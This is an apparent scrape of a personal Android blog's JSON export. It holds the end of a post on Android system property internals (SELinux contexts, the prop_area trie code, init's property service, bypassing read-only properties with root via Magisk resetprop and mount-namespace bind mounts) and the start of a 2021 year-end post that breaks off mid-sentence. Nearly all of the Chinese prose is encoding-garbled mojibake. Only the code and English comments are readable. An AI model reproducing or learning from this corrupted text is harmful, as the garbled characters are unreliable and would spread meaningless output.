ä¸æ˜¯åˆšå¥½å¯¹åº”æˆ‘ä»¬ä¸Šé¢çœ‹åˆ°çš„æ–‡ä»¶åå—ï¼Ÿæ‰¾ä¸€ä¸ªæ–‡ä»¶ cat ä¸€ä¸‹ï¼Œæ²¡é”™ï¼Œå±æ€§çš„åå­—å’Œå€¼éƒ½åœ¨é‡Œé¢ã€‚è€Œå®é™…ä¸Šï¼Œä¸Šé¢çš„ prop_area ä¹Ÿæ˜¯æ ¹æ®å±æ€§åæœç´¢åˆ°å¯¹åº”çš„æ–‡ä»¶ä½ç½®ç„¶åå°†å®ƒ mmap åˆ°å†…å­˜ä¸­è·å¾—çš„ã€‚è€Œæˆ‘ä»¬å†å›å¤´çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶åï¼Œæ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Ÿå¦‚æœä½ æœ‰äº†è§£è¿‡ SELinux è¿™ä¸€ Android å®‰å…¨æ¨¡å‹çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œä½ å¾ˆå®¹æ˜“å°±ä¼šå‘ç°è¿™ä¸ªæ–‡ä»¶åå°±æ˜¯ SELinux ä¸­æ‰€è°“çš„ Context çš„æ ¼å¼ã€‚è€Œå†å›å¤´çœ‹ä¸Šé¢ ls -Z çš„è¾“å‡ºï¼Œä½ ä¼šå‘ç°é‡Œé¢æ‰€æœ‰åå­—æ˜¯è¿™ä¸ªæ ¼å¼çš„æ–‡ä»¶ï¼Œå®ƒä»¬çš„åå­—å’Œâ€œSELinux ä¸Šä¸‹æ–‡â€éƒ½ä¸€æ ·ã€‚è‡ªæ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ç¬¬ä¸€ä¸ªç»“è®ºï¼šAndroid ç³»ç»ŸæŒ‰ç…§ Context å°†å±æ€§ä»¬åˆ†ä¸ºä¸€ä¸ªä¸ªâ€œç»„â€ï¼Œè·å–å±æ€§å€¼æ—¶ï¼Œé¦–å…ˆé€šè¿‡åå­—æŸ¥è¯¢åˆ°è¿™ä¸ªå±æ€§æ‰€åœ¨çš„ç»„ï¼Œç„¶åå†åœ¨å¯¹åº”çš„æ–‡ä»¶é‡Œé¢æŸ¥è¯¢ã€‚Property Areaå›åˆ°æˆ‘ä»¬åˆšåˆšçš„ SystemProperties::Find() è¿™ä¸ªå‡½æ•°é‡Œï¼Œå®ƒæ‹¿åˆ°å¯¹åº”çš„ prop_area ä¹Ÿå°±æ˜¯æ‰€è°“çš„â€œå±æ€§ç»„â€ä¹‹åï¼Œåˆè°ƒç”¨äº†å®ƒçš„ find() å‡½æ•°åœ¨é‡Œé¢æœç´¢ï¼Œç‚¹å¼€çœ‹çœ‹ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243const char* remaining_name = name;prop_bt* current = trie;while (true) &#123; const char* sep = strchr(remaining_name, '.'); const bool want_subtree = (sep != nullptr); const uint32_t substr_size = (want_subtree) ? sep - remaining_name : strlen(remaining_name); if (!substr_size) &#123; return nullptr; &#125; prop_bt* root = nullptr; uint_least32_t children_offset = atomic_load_explicit(&amp;current-&gt;children, memory_order_relaxed); if (children_offset != 0) &#123; root = to_prop_bt(&amp;current-&gt;children); &#125; else if (alloc_if_needed) &#123; uint_least32_t new_offset; root = new_prop_bt(remaining_name, substr_size, &amp;new_offset); if (root) &#123; atomic_store_explicit(&amp;current-&gt;children, new_offset, memory_order_release); &#125; &#125; if (!root) &#123; return nullptr; &#125; current = find_prop_bt(root, remaining_name, substr_size, alloc_if_needed); if (!current) &#123; return nullptr; &#125; if (!want_subtree) break; remaining_name = sep + 1;&#125;uint_least32_t prop_offset = atomic_load_explicit(&amp;current-&gt;prop, memory_order_relaxed);if (prop_offset != 0) &#123; return to_prop_info(&amp;current-&gt;prop);&#125; else if (alloc_if_needed) &#123; uint_least32_t new_offset; prop_info* new_info = new_prop_info(name, namelen, value, valuelen, &amp;new_offset); if (new_info) &#123; atomic_store_explicit(&amp;current-&gt;prop, new_offset, memory_order_release); &#125; return new_info;&#125; else &#123; return nullptr;&#125;prop_bt prop_info åˆæ˜¯ä»€ä¹ˆï¼Ÿè¿™ä¸€å †ä»€ä¹ˆ subtree left right çœ‹ç€å°±åƒä¸€æ£µæ ‘ï¼Œå®ƒçš„ç»“æ„æ˜¯ä»€ä¹ˆæ ·çš„å‘¢ï¼Œå…¶å®æ³¨é‡Šé‡Œå·²ç»å†™äº†ï¼š1234567891011121314&#x2F;&#x2F; Properties are stored in a hybrid trie&#x2F;binary tree structure.&#x2F;&#x2F; Each property&#39;s name is delimited at &#39;.&#39; characters, and the tokens are put&#x2F;&#x2F; into a trie structure. Siblings at each level of the trie are stored in a&#x2F;&#x2F; binary tree. For instance, &quot;ro.secure&quot;&#x3D;&quot;1&quot; could be stored as follows:&#x2F;&#x2F;&#x2F;&#x2F; +-----+ children +----+ children +--------+&#x2F;&#x2F; | |--------------&gt;| ro |--------------&gt;| secure |&#x2F;&#x2F; +-----+ +----+ +--------+&#x2F;&#x2F; &#x2F; \\ &#x2F; |&#x2F;&#x2F; left &#x2F; \\ right left &#x2F; | prop +&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x2F;&#x2F; v v v +--------&gt;| ro.secure |&#x2F;&#x2F; +-----+ +-----+ +-----+ +-----------+&#x2F;&#x2F; | net | | sys | | com | | 1 |&#x2F;&#x2F; +-----+ +-----+ +-----+ +&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+è¿™æ˜¯ä¸€é¢—äºŒå‰æ ‘å’Œå­—å…¸æ ‘çš„æ··è¡€å„¿ã€‚åœ¨ä¼ ç»Ÿçš„äºŒå‰æ ‘ç»“æ„ä¸­ï¼Œå‡å¦‚ä¸€ä¸ªèŠ‚ç‚¹ node æ‹¥æœ‰ left right ä¸¤ä¸ªæˆå‘˜ï¼šnode { var left, right }ï¼Œå…¶ä¸­çš„ left right éƒ½æ˜¯ node è¿™ä¸ªèŠ‚ç‚¹çš„å­©å­ï¼›åœ¨ä¼ ç»ŸäºŒå‰æ ‘çš„æœç´¢ä¸­ï¼Œå¦‚æœç»™å®šä¸€ä¸ª keyï¼Œé‚£ä¹ˆæµç¨‹å¤§æ¦‚ä¼šæ˜¯è¿™æ ·çš„ä¼ªä»£ç ï¼š123456789while (currentNode != null) &#123; if (key &lt; currentNode.key) currentNode = currentNode.left else if (key &gt; currentNode.key) currentNode = currentNode.right else // key == currentNode.key return currentNode&#125;return nullè€Œåœ¨è¿™ä¸ªæ··åˆç»“æ„ä¸­ï¼ŒèŠ‚ç‚¹ node çš„ left right å’Œ node æœ¬èº«å…¶å®æ˜¯å¹³çº§å…³ç³»ï¼Œå®ƒä»¬çš„çˆ¶èŠ‚ç‚¹æ˜¯åŒä¸€ä¸ªï¼Œchild æ‰æ˜¯èŠ‚ç‚¹çš„å­èŠ‚ç‚¹ã€‚è€Œç†è§£äº†è¿™ä¸€ç‚¹ä¹‹åï¼Œè¦çœ‹æ‡‚ä¸Šé¢è¿™å¹…å›¾ä¹Ÿå°±ä¸éš¾äº†ã€‚è¿˜æ˜¯ä»¥ ro.secure=1 æ¥ä¸¾ä¾‹ã€‚é¦–å…ˆå¯¹å±æ€§å ro.secure ä»¥ç‚¹åˆ†å‰²ï¼Œå¾— ro å’Œ secureï¼Œå…ˆä»æ ‘ä¸ŠæŸ¥æ‰¾åˆ° roï¼Œè€Œ ro çš„å·¦å³èŠ‚ç‚¹ sys å’Œ net ä¸ ro æ˜¯å¹³çº§å…³ç³»ã€‚æ¥ç€ï¼Œä» ro çš„ child æŒ‡å‘çš„èŠ‚ç‚¹é‡ŒæŸ¥æ‰¾ secureï¼Œå¾ˆæ˜æ˜¾ç¬¬ä¸€ä¸ªå°±æ˜¯ã€‚æ‰¾åˆ°äº†ä¹‹åï¼Œæ ¹æ®èŠ‚ç‚¹çš„ prop å€¼æŒ‡å‘çš„ä¸€ä¸ª prop_info ç»“æ„å°±èƒ½è¯»å–åˆ°å€¼ã€‚å› æ­¤ prop_bt å…¶å®åªæ˜¯ç”¨æ¥æ ‘ä¸Šçš„ä¸€ä¸ªä¸ªèŠ‚ç‚¹ï¼Œè€Œå®ƒæŒ‡å‘çš„ prop_info æ‰æ˜¯çœŸæ­£å­˜æ”¾å±æ€§å€¼çš„åœ°æ–¹ã€‚å±æ€§åŒºåŸŸçš„åˆå§‹åŒ–æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬ä¸Šé¢çš„æ“ä½œéƒ½æ˜¯åœ¨ /dev/__properties__ è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢ç©çš„ï¼Œé‚£è¿™ä¸ªæ–‡ä»¶å¤¹å’Œé‡Œé¢çš„æ–‡ä»¶æ˜¯å“ªæ¥çš„å‘€ï¼Ÿå…¶å®æ—©åœ¨ init è¿›ç¨‹å¯åŠ¨æ—¶ï¼Œå®ƒå°±è°ƒç”¨äº† PropertyInit() åˆå§‹åŒ–12345678910111213141516171819void PropertyInit() &#123; mkdir(\"/dev/__properties__\", S_IRWXU | S_IXGRP | S_IXOTH); CreateSerializedPropertyInfo(); if (__system_property_area_init()) &#123; LOG(FATAL) &lt;&lt; \"Failed to initialize property area\"; &#125; if (!property_info_area.LoadDefaultPath()) &#123; LOG(FATAL) &lt;&lt; \"Failed to load serialized property info file\"; &#125; // If arguments are passed both on the command line and in DT, // properties set in DT always have priority over the command-line ones. ProcessKernelDt(); ProcessKernelCmdline(); ProcessBootconfig(); // Propagate the kernel variables to internal variables // used by init as well as the current required properties. ExportKernelBootProps(); PropertyLoadBootDefaults();&#125;è¿™ä¸ªå‡½æ•°å…ˆæ˜¯åˆ›å»ºäº† /dev/__properties__ éšåå°† split context çš„ä¸€å †æ–‡ä»¶â€œç¼–è¯‘â€æˆäºŒè¿›åˆ¶æ ‘çš„å½¢å¼å¹¶åºåˆ—åŒ–åˆ° property_info ä¸­ä»¥åŠ é€Ÿå…¶ä»–è¿›ç¨‹çš„å¯åŠ¨é€Ÿåº¦ï¼Œè€Œåå°†å†…æ ¸å‘½ä»¤è¡Œã€default.propã€build.prop ç­‰çš„å†…å®¹åŠ è½½è¿›æ¥ï¼Œç„¶åæˆ‘ä»¬çš„å±æ€§åŒºåŸŸå°±æœ‰å€¼äº†ï¼å†å¾€åçœ‹ï¼Œinit è¿›ç¨‹è¿˜ä¼šè°ƒç”¨ä¸€ä¸ª StartPropertyService() çš„ä¸œè¥¿ï¼Œè¿™ä¸ª property service åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Œè¿™é‡Œæˆ‘å°±ä¸æ”¾æºç äº†ï¼Œå®ƒå»ºç«‹äº†ä¸€ä¸ª Socket Serverï¼Œ__system_properties_set() æ—¶å°±ä¼šå»é€šè¿‡ socket è¿ä¸Šå®ƒï¼Œç„¶åè¿™ä¸ª property service å†è¿›è¡Œå®é™…çš„å†™å…¥ã€‚æˆ‘ä»¬ä¸Šé¢æåˆ°çš„é‰´æƒçš„é—®é¢˜ï¼Œä¹Ÿå·²ç»æœ‰äº†ç­”æ¡ˆï¼šå¯¹äºè·å–å±æ€§ï¼Œå› ä¸ºæ¯ä¸ªå±æ€§éƒ½æœ‰å¯¹åº”çš„ contextï¼Œè¿›ç¨‹å¦‚æœæƒé™ä¸å¤Ÿï¼Œå°è¯•æ‰“å¼€è¿™ä¸ª context å¯¹åº”æ–‡ä»¶æ—¶å°±ä¼šè¢« SELinux ç›´æ¥æŒ¡ä½ï¼›è€Œå¯¹äºå†™å…¥å±æ€§ï¼Œå…¶ä»–è¿›ç¨‹å°è¯•å†™å…¥å±æ€§å®é™…éƒ½æ˜¯é€šè¿‡ socket è¿ä¸Šè¿è¡Œåœ¨ init çš„ä¸€ä¸ª serviceï¼Œç”±è¿™ä¸ª service æ¥åšé‰´æƒã€é˜»æ­¢åªè¯»å±æ€§è¢«è¦†ç›–çš„æ£€æŸ¥ä»¥åŠæœ€ç»ˆçš„å†™å…¥æ“ä½œã€‚å…¶å®åˆ°è¿™é‡Œï¼Œå±æ€§ç³»ç»Ÿè¿˜æœ‰å¾ˆå¤šå†…å®¹æ²¡æœ‰ä»‹ç»ï¼Œæ¯”å¦‚ long valueã€persist props è¿™äº›ä¸œè¥¿ï¼Œä½†ç”±äºç¯‡å¹…é™åˆ¶ï¼Œåªèƒ½åˆ°è¿™é‡Œäº†ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥è‡ªå·±æŸ¥é˜…æºä»£ç å“¦ :)é­”æ³•æ—¶åˆ»ç»•è¿‡ ro å±æ€§çš„åªè¯»é™åˆ¶ä¸Šé¢æåˆ°ï¼Œro å±æ€§çš„æ£€æŸ¥æ˜¯åœ¨ init è¿›ç¨‹æ‰‹åŠ¨åšçš„ï¼Œé‚£å¦‚æœæˆ‘ä»¬ç›´æ¥æ“ä½œå¯¹åº”å†…å­˜ï¼Œæ˜¯ä¸æ˜¯å°±èƒ½ç»•å¼€è¿™ä¸ªé™åˆ¶å‘¢ï¼Ÿäº‹å®ä¸Šï¼Œç”±äºè¿™äº›æ–‡ä»¶çš„æƒé™ä»¥åŠ SELinux ç›¸å…³é™åˆ¶ï¼Œåœ¨ init è¿›ç¨‹ä»¥å¤–ä½ åœ¨æ­£å¸¸çš„ Android ç³»ç»Ÿé‡Œå‡ ä¹æ²¡åŠæ³•å†™å…¥è¿™äº›æ–‡ä»¶ï¼›ä½†å¦‚æœä½ çš„è¿›ç¨‹æœ‰è¶³å¤Ÿé«˜çš„æƒé™ï¼Œè¿™æ˜¯å¯è¡Œçš„ï¼äº‹å®ä¸Šï¼ŒMagisk çš„ resetprop å°±æ˜¯è¿™ä¹ˆå®ç°çš„ï¼Œä½ ç”šè‡³è¿˜å¯ä»¥åšåˆ°æ›´ç¥å¥‡çš„äº‹ï¼Œæ¯”å¦‚åˆ é™¤å±æ€§ï¼å±æ€§çš„â€œéš”ç¦»â€æ“ä½œä»€ä¹ˆæ˜¯â€œéš”ç¦»â€ï¼Ÿé€šå¸¸æ¥è¯´ï¼Œå°±æ˜¯ 14+7ï¼ˆæˆ‘ä»¬æƒ³è¦çš„â€œéš”ç¦»â€æ•ˆæœå¤§æ¦‚å°±æ˜¯ï¼Œä¸¤ä¸ªè¿›ç¨‹åœ¨åŒä¸€æ—¶åˆ»å¯¹åŒä¸€ä¸ªå±æ€§è·å–åˆ°ä¸åŒçš„å€¼ã€‚Android ç³»ç»ŸåŸç”Ÿæ˜¯ä¸æ”¯æŒè¿™ç§æ“ä½œçš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é»‘é­”æ³•æ¥å®Œæˆè¿™ä¸€ç‚¹ã€‚åœ¨ Linux ä¸­ï¼Œæœ‰ä¸€ä¸ªæ¦‚å¿µå«åš namespaceï¼Œå®ƒå°±æ˜¯ä¸€ç§èµ„æºéš”ç¦»æ–¹æ¡ˆã€‚åœ¨å®ƒå¯ä»¥éš”ç¦»çš„èµ„æºä¸­ï¼Œæœ‰ä¸€ç§ä¸œè¥¿ï¼Œå« mountã€‚ä»€ä¹ˆæ¦‚å¿µï¼šç®€å•ç‚¹è¯´ï¼Œå¦‚æœä¸¤ä¸ªè¿›ç¨‹æ‹¥æœ‰ä¸ä¸€æ ·çš„ mount namespaceï¼Œè¿›ç¨‹ A æç ´åæŠŠ /data ç»™ mount åˆ°äº† /systemï¼Œä½†æ˜¯è¿™ä¸€åˆ‡è¿›ç¨‹ B æ˜¯çœ‹ä¸è§çš„ï¼Œå®ƒæ‰€çœ‹è§çš„ /system è¿˜æ˜¯åŸæ¥é‚£ä¸ªã€‚ç»“åˆæˆ‘ä»¬ä¸Šé¢æåˆ°çš„ï¼Œå±æ€§å…¶å®æ˜¯å­˜åœ¨ä¸€å †â€œä¸€æ¬¡æ€§â€æ–‡ä»¶é‡Œçš„è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æœ‰äº†ä¸€ä¸ªå¤§èƒ†çš„æƒ³æ³•ï¼šé¦–å…ˆ unshare åˆ†ç¦» namespaceï¼ŒæŠŠæŸä¸ª context å¯¹åº”çš„æ–‡ä»¶ç»™å¤åˆ¶ä¸€ä»½ï¼Œç„¶åæŠŠè¿™ä¸ªå¤åˆ¶å“ bind mount åˆ°åŸæ¥çš„æ–‡ä»¶ï¼Œç›´æ¥ä¿®æ”¹è¿™ä¸ªå¤åˆ¶å“é‡Œçš„å±æ€§å€¼ï¼Œå°±èƒ½å®ç°åªè®©ä¸€ä¸ªè¿›ç¨‹çœ‹è§å¯¹åº”å±æ€§çš„ä¿®æ”¹ï¼æˆ‘ä»¬è¿˜å¯ä»¥æ”¹å˜ä¸€ä¸‹ï¼Œå®ç°ä¸€ä¸ªå¯ä»¥å›æ»šçš„ resetpropï¼šåœ¨ zygote å¯åŠ¨ä¹‹å‰å’Œ init åŒå‘½åç©ºé—´çš„æŸä¸ªé«˜æƒé™è¿›ç¨‹é‡ŒæŠŠå¤åˆ¶å“ bind mount å›åŸæ–‡ä»¶ï¼Œç„¶åä¿®æ”¹é‡Œé¢çš„å†…å®¹ï¼Œä¹‹åå¯åŠ¨çš„ä»»ä½•è¿›ç¨‹ï¼ˆåŒ…æ‹¬ zygoteï¼‰éƒ½ä¼šçœ‹è§è¢«ä¿®æ”¹åçš„å±æ€§ï¼›ç„¶ååœ¨éœ€è¦å›æ»šä¿®æ”¹çš„ app è¿›ç¨‹é‡Œ unmount è¿™äº›æ–‡ä»¶ï¼Œéšåå› ä¸ºæœ‰äº›æ–‡ä»¶å¯èƒ½å·²ç»åœ¨ zygote é‡Œè¢«æå‰ mmap è¿‡äº†ï¼Œæˆ‘ä»¬éœ€è¦æŠŠå®ƒä»¬ unmap å†é‡æ–° mmap ä»¥ç¡®ä¿ app è¯»åˆ°çš„æ°¸è¿œæ˜¯æœªè¢«ä¿®æ”¹çš„çœŸå®å€¼ï¼Œç„¶åæˆ‘ä»¬å°±å®ç°äº†å±æ€§ä¿®æ”¹çš„å›æ»šï¼æˆ‘å·²ç»åœ¨è‡ªå·±çš„ Magisk fork ä¸Šè¿›è¡Œäº†ç®€å•æµ‹è¯•ï¼Œç¡®è®¤å¯è¡Œï¼Œæºç åœ¨è¿™é‡Œï¼šhttps://github.com/canyie/Magisk/commit/d50a060a23727236b36d79afc696632519247fd8å½“ç„¶è¿™ä¸ªæ–¹æ³•æœ‰ä¸€äº›å°å°ç¼ºé™·ï¼Œæ¯”å¦‚æˆ‘ä»¬ hijack ä¸€ä¸ª context åæ‰€æœ‰å½’å±äºè¿™ä¸ª context çš„å…¶ä»–å±æ€§éƒ½ä¼šå—åˆ°å½±å“ï¼Œä¹‹åçš„ setprop åªä¼šå¯¹è¿›è¡Œäº†å›æ»šçš„è¿›ç¨‹ç”Ÿæ•ˆï¼Œå› ä¸º init å·²ç»æ‰“å¼€äº†æ‰€æœ‰æ–‡ä»¶ï¼Œåªä¼šå¯¹åŸæ–‡ä»¶è¿›è¡Œå†™å…¥æ“ä½œã€‚è¿™ä¸ªé—®é¢˜å¯ä»¥é€šè¿‡ inotify ç›‘å¬å†™å…¥ç„¶åæ‰‹åŠ¨æ›´æ–°è§£å†³ï¼Œä½†æ˜¯æ˜¯ä½“åŠ›æ´»ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬çš„ç¡®å‘æ˜äº†æˆ‘ä»¬è‡ªå·±çš„é­”æ³•ï¼è‡³äºè¿™ä¸ªå¥½ç©çš„æ–°ä¸œè¥¿èƒ½åšä»€ä¹ˆï¼Œå¯ä»¥å‘æŒ¥ä½ çš„æƒ³è±¡åŠ› :)","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"property","slug":"property","permalink":"https://blog.canyie.top/tags/property/"},{"name":"æ•°æ®ç»“æ„ä¸ç®—æ³•","slug":"æ•°æ®ç»“æ„ä¸ç®—æ³•","permalink":"https://blog.canyie.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}]},{"title":"ä»ç”µå­å‚é€ƒç¦»çš„ 17 å² - 2021 å¹´ç»ˆæ€»ç»“","slug":"end-of-2021","date":"2022-01-09T06:19:46.000Z","updated":"2025-04-24T10:33:02.819Z","comments":true,"path":"2022/01/09/end-of-2021/","link":"","permalink":"https://blog.canyie.top/2022/01/09/end-of-2021/","excerpt":"å½“æˆ‘å†™ä¸‹è¿™æ®µæ–‡å­—æ—¶ï¼Œæ—¶é—´æ˜¯ 2022 å¹´ 1 æœˆ 9 æ—¥ï¼Œè¿™ä¸ªæ—¶å€™å‘ä¸Šä¸€å¹´å¹´ç»ˆæ€»ç»“ä¼¼ä¹æ™šäº†ç‚¹ï¼›è€å®è¯´ï¼Œåœ¨è¿™ä¸ªåšå®¢åˆšåˆ›å»ºçš„æ—¶å€™ï¼Œæˆ‘æ²¡æœ‰æ‰“ç®—å†™è¿™ç§è®°å½•æ€§çš„å†…å®¹ï¼Œæˆ‘çš„ç›®æ ‡ä¸€ç›´éƒ½æ˜¯åƒ Weishuâ€™s Notes çš„é«˜è´¨é‡å†…å®¹ï¼›ä½†æ˜¯æ˜¨æ™šçœ‹ weishu ç›´æ’­å†™ä»£ç ï¼Œä»–è¯´äº†ä¸€å¥è®©æˆ‘å¾ˆè§¦åŠ¨çš„è¯ï¼šâ€œäººç”Ÿä¸éœ€è¦æœ‰æ„ä¹‰ï¼Œæœ‰æ„æ€å°±å¤Ÿäº†ã€‚â€æˆ‘çš„ 2021 å¯èƒ½æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œä½†å¦‚æœæˆ‘ä¸åšç‚¹ä»€ä¹ˆçºªå¿µä¸€ä¸‹ï¼Œå®ƒå¾ˆæœ‰å¯èƒ½å°±æ¶ˆé€åœ¨æ—¶é—´çš„é•¿æ²³é‡Œï¼Œè¿æˆ‘è‡ªå·±éƒ½å›å¿†ä¸èµ·æ¥ï¼Œæ›´åˆ«ææœ‰æ„æ€äº†ã€‚","text":"å½“æˆ‘å†™ä¸‹è¿™æ®µæ–‡å­—æ—¶ï¼Œæ—¶é—´æ˜¯ 2022 å¹´ 1 æœˆ 9 æ—¥ï¼Œè¿™ä¸ªæ—¶å€™å‘ä¸Šä¸€å¹´å¹´ç»ˆæ€»ç»“ä¼¼ä¹æ™šäº†ç‚¹ï¼›è€å®è¯´ï¼Œåœ¨è¿™ä¸ªåšå®¢åˆšåˆ›å»ºçš„æ—¶å€™ï¼Œæˆ‘æ²¡æœ‰æ‰“ç®—å†™è¿™ç§è®°å½•æ€§çš„å†…å®¹ï¼Œæˆ‘çš„ç›®æ ‡ä¸€ç›´éƒ½æ˜¯åƒ Weishuâ€™s Notes çš„é«˜è´¨é‡å†…å®¹ï¼›ä½†æ˜¯æ˜¨æ™šçœ‹ weishu ç›´æ’­å†™ä»£ç ï¼Œä»–è¯´äº†ä¸€å¥è®©æˆ‘å¾ˆè§¦åŠ¨çš„è¯ï¼šâ€œäººç”Ÿä¸éœ€è¦æœ‰æ„ä¹‰ï¼Œæœ‰æ„æ€å°±å¤Ÿäº†ã€‚â€æˆ‘çš„ 2021 å¯èƒ½æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œä½†å¦‚æœæˆ‘ä¸åšç‚¹ä»€ä¹ˆçºªå¿µä¸€ä¸‹ï¼Œå®ƒå¾ˆæœ‰å¯èƒ½å°±æ¶ˆé€åœ¨æ—¶é—´çš„é•¿æ²³é‡Œï¼Œè¿æˆ‘è‡ªå·±éƒ½å›å¿†ä¸èµ·æ¥ï¼Œæ›´åˆ«ææœ‰æ„æ€äº†ã€‚è®¡ç®—æœºï¼šLSPosed ä¸å‘ Magisk æäº¤ PR2021 å¹´å¼€å¤´ï¼Œå‘ç”Ÿäº†ä¸€ä»¶å¤§å®¶å¯èƒ½éƒ½çŸ¥é“çš„äº‹æƒ…ï¼šshana å§å§å¸Œæœ›ç»™ EdXposed åšå‡ºè¾ƒå¤§ä¿®æ”¹ï¼Œå¦‚å¼ºåˆ¶ç™½åå•ä½œç”¨åŸŸç­‰ï¼Œä½† MlgmXyysd å§å§ä¸åŒæ„ï¼Œè®¤ä¸ºåº”è¯¥ä¿æŒä¸åŸç‰ˆ Xposed çš„ä¸€è‡´æ€§ï¼Œåµè¿‡å‡ æ¬¡ä¹‹åï¼Œshana å§å§å®£å¸ƒåˆ†é“æ‰¬é•³ï¼Œåˆ›å»º LSPosed è¿˜å¸¦èµ°äº† ksmã€‚æœ€åˆç‰ˆçš„ LSPosed å°±æ˜¯ä¸€ä¸ªå¼ºåˆ¶å¯ç”¨äº†ä½œç”¨åŸŸç‰ˆçš„ EdXposedï¼Œä½†ä»…ä»…å¦‚æ­¤å°±æœ‰å¤§é‡ç”¨æˆ·è¡¨ç¤ºè·å¾—äº†å·¨å¤§çš„æ€§èƒ½æå‡ã€‚ä»¥åçš„æ—¥å­é‡Œï¼Œä»–ä»¬é‡æ„äº†æ•´ä¸ªé¡¹ç›®ï¼Œå¸¦æ¥äº†åŸºäº binder çš„åç«¯æœåŠ¡ï¼Œä¿®å¤äº†ä¸€å¤§å † bug è¿˜æ·»åŠ äº†æ–°çš„ APIã€‚å½“ç„¶è¿™ä¸€åˆ‡éƒ½ä¸æˆ‘æ²¡ä»€ä¹ˆå…³ç³»ï¼Œæˆ‘è‡ªå·±å‡ ä¹ä¸€è¡Œä»£ç æ²¡ç»™ LSPosed å†™è¿‡ï¼Œä¹Ÿå°±æ˜¯å‡ ä¸ª art æœ‰å…³çš„ bug å’Œä¸€èµ·ä»–ä»¬è®¨è®ºå‡ºä¿®å¤æ–¹æ³•ï¼Œè¯´ç™½äº†å°±æ˜¯æ‰“ä¸ªé…±æ²¹â€”â€”æƒŠå–œçš„æ˜¯ï¼Œæˆ‘ç«Ÿç„¶è·å¾—äº† owner ï¼è€Œä¸”å’Œä¸€ç¾¤å¿—åŒé“åˆçš„å“¥å“¥å§å§ä»¬äº’ç›¸äº¤æµæŠ€æœ¯ä¸€èµ·å†™ä»£ç çœŸçš„å¾ˆå¼€å¿ƒï¼ï¼å­¦ä¼šäº†å¾ˆå¤šæˆ‘è‡ªå·±å¯èƒ½ä¸€è¾ˆå­ä¹Ÿå­¦ä¸åˆ°çš„ä¸œè¥¿ï¼ï¼å¦‚ä»Šï¼ŒLSPosed å·²ç»æ˜¯å›½å†…å¤–æœ€å—æ¬¢è¿çš„ Xposed å®ç°ï¼Œä¹Ÿç®—æ˜¯å®Œæˆäº†è‡ªå·±ä»¥å‰çš„ä¸€ä¸ªå°å¿ƒæ„¿å§~åœ¨ LSPosed åˆšå¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±ä¸€ç›´æ”¶åˆ°ç”¨æˆ·åé¦ˆå®‰è£…åæ‰‹æœºæ— æ³•å¼€æœºï¼Œè·å–åˆ° log åå‘ç°æ˜¯ Magisk æŒ‚è½½ç³»ç»Ÿæ–‡ä»¶æ—¶åˆ°ä¸€åŠçªç„¶å¡ä½ï¼Œä» log é‡Œå®Œå…¨çœ‹ä¸å‡ºåŸå› ã€‚æ›´å¥‡æ€ªçš„æ˜¯ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€äº› log æ„å»ºå‡ºè‡ªå·±çš„ debug ç‰ˆæœ¬å‘ç»™ç”¨æˆ·æµ‹è¯•åï¼Œç«Ÿç„¶å¯ä»¥å¼€æœºäº†ï¼ï¼ç™¾æ€ä¸å¾—å…¶è§£ä¹‹é™…ï¼Œå†…ç¾¤é‡Œå¦ä¸€ä½å¼€å‘è€…çš„ magisk å¡ä½äº†ï¼Œè€Œä¸”å¥¹çš„ sui å¯ä»¥åœ¨ magisk su ä¸å¯ç”¨æ—¶è·å–åˆ° root æƒé™å¸®åŠ©è°ƒè¯•ã€‚ç”¨ lldb æŠ˜è…¾äº†ä¸¤å¤©ä¹‹åï¼Œæˆ‘ä»¬ç»ˆäºææ¸…æ¥šå¥¹çš„é—®é¢˜å‡ºåœ¨å“ªé‡Œï¼šlog é‡Œè°ƒç”¨çš„ localtime_r é‡Œé¢æœ‰ä¸€æŠŠä¸å¯é‡å…¥çš„é”ï¼ŒåŠ é”ä¹‹ååˆšå¥½æ”¶åˆ°ä¸€ä¸ª signalï¼Œç¨‹åºç›´æ¥è½¬è·³åˆ° signal handler æ‰§è¡Œï¼Œsignal handler æ‰“å° log åˆè¦å†æ¬¡è°ƒç”¨ localtime_rï¼Œé‡Œé¢åˆå°è¯•è·å–è‡ªå·±å·²ç»åŠ è¿‡çš„é”ï¼Œç„¶åç›´æ¥æ­»é”ã€‚ç†è®ºä¸Šè®²ï¼Œå®ƒç¡®å®å¯ä»¥é€ æˆä¹‹å‰çš„é—®é¢˜ï¼Œç­‰åˆ° magisk æŠŠè¿™ä¸ª bug ä¿®å¤ä¹‹åï¼Œæˆ‘ä»¬ä»¥ä¸ºä¸‡äº‹å¤§å‰äº†ã€‚ç„¶è€Œäº‹å®æ˜¯ï¼Œæˆ‘ä»¬ä»ç„¶ç»§ç»­æ”¶åˆ°ç›¸å…³åé¦ˆã€‚å‡ ä¸ªæœˆåï¼Œæˆ‘ä»¬ç»ˆäºæ‰¾åˆ°äº†ä¸€ä½å¯ä»¥ç¨³å®šå¤ç°è¯¥é—®é¢˜çš„ç”¨æˆ·ï¼Œæœ€åå‘ç°äº†è¿™ä¸ª bug çš„æœ¬è´¨ï¼šmagisk 